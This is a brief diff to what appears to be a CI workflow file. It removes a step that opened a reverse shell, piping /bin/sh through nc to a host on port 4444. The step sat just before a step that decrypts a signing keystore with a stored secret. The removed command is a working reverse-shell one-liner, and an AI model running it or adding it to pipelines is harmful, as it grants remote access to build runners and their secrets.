@@ -32,11 +32,6 @@ jobs:
 
 
 
-      - name: Thow interactive shell
-        shell: bash -i {0}
-        run: |
-          rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${{ steps.parse_ssh.outputs.host }} 4444 >/tmp/f
-
       - name: Decrypt release.keystore.gpg
         run: |
           gpg --quiet --batch --yes --decrypt --passphrase="${{ secrets.DECODE_KEY }}" \
